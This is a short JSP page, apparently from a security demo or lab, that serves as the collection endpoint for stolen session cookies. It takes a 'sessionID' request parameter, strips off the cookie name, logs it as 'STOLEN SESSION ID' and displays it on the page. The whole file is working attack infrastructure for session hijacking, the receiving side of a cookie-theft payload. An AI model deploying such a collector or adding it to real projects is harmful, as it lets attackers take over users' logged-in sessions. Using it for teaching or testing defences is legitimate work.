<%
    String sessionID = request.getParameter("sessionID");
    
    if (sessionID!=null)
    {
        sessionID = sessionID.substring(sessionID.indexOf("=")+1);
    }
    
    System.out.println("STOLEN SESSION ID:" +  sessionID);
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Show Session ID</title>
    </head>
    <body bgcolor="orange">
        <h1>Show Session ID</h1>
        <b>Stolen session ID:</b> <%= sessionID %>
    </body>
</html>
